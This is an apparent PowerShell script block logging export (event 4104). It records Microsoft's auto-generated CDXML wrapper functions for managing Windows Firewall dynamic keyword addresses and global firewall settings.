    ${Id},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AllAutoResolve},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AllNonAutoResolve},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallDynamicKeywordAddress')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Id') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Id})
        $__cmdletization_queryBuilder.FilterByProperty('Id', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ById', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('AllAutoResolve') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('AllAutoResolve', ${AllAutoResolve})
    }
    if ($PSBoundParameters.ContainsKey('AllNonAutoResolve') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('AllNonAutoResolve', ${AllNonAutoResolve})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ById', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallDynamicKeywordAddress.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetFirewallDynamicKeywordAddress' -Alias '*'
        


ScriptBlock ID: 30c30f2c-713b-41bd-91d0-577a9598a919
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 2):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallDynamicKeywordAddress'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetFirewallDynamicKeywordAddress
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Id},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Keyword},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Addresses},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${AutoResolve},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Id')) {
          [object]$__cmdletization_value = ${Id}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Keyword')) {
          [object]$__cmdletization_value = ${Keyword}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Keyword'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Keyword'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Addresses')) {
          [object]$__cmdletization_value = ${Addresses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Addresses'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Addresses'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AutoResolve')) {
          [object]$__cmdletization_value = ${AutoResolve}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoResolve'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoResolve'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallDynamicKeywordAddress.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetFirewallDynamicKeywordAddress' -Alias '*'
        

function Update-NetFirewallDynamicKeywordAddress
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [string]
    ${Id},

    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [string]
    ${Addresses},

    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [bool]
    ${Append},

    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='UpdateDynamicKeywordAddress1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Id')) {
          [object]$__cmdletization_value = ${Id}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Addresses')) {
          [object]$__cmdletization_value = ${Addresses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Addresses'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Addresses'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Append')) {
          [object]$__cmdletization_value = ${Append}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Append'; ParameterType = 'System.Boolean'

ScriptBlock ID: 30c30f2c-713b-41bd-91d0-577a9598a919
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (2 of 2):
es.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('CertValidationLevel')) {
            [object]$__cmdletization_value = ${CertValidationLevel}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CertValidationLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.CRLCheck'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CertValidationLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.CRLCheck'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowIPsecThroughNAT')) {
            [object]$__cmdletization_value = ${AllowIPsecThroughNAT}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowIPsecThroughNAT'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecThroughNAT'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowIPsecThroughNAT'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecThroughNAT'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MaxSAIdleTimeSeconds')) {
            [object]$__cmdletization_value = ${MaxSAIdleTimeSeconds}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxSAIdleTimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxSAIdleTimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('KeyEncoding')) {
            [object]$__cmdletization_value = ${KeyEncoding}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyEncoding'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyEncoding'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyEncoding'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyEncoding'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EnablePacketQueuing')) {
            [object]$__cmdletization_value = ${EnablePacketQueuing}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnablePacketQueuing'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PacketQueuing'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnablePacketQueuing'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PacketQueuing'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallSetting' -Alias '*'
        


ScriptBlock ID: fdf4a81f-7a34-48ac-8245-01028a1b5edb
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 2):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetSecuritySettingData'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallSetting
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetSecuritySettingData')]

    param(
    
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallSetting' -Alias '*'
        

function Set-NetFirewallSetting
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetSecuritySettingData')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetSecuritySettingData')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.TrafficExemption]
    ${Exemptions},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${EnableStatefulFtp},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${EnableStatefulPptp},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteMachineTransportAuthorizationList},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteMachineTunnelAuthorizationList},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteUserTransportAuthorizationList},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteUserTunnelAuthorizationList},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${RequireFullAuthSupport},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.CRLCheck]
    ${CertValidationLevel},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecThroughNAT]
    ${AllowIPsecThroughNAT},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${MaxSAIdleTimeSeconds},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyEncoding]
    ${KeyEncoding},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PacketQueuing]
    ${EnablePacketQueuing},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

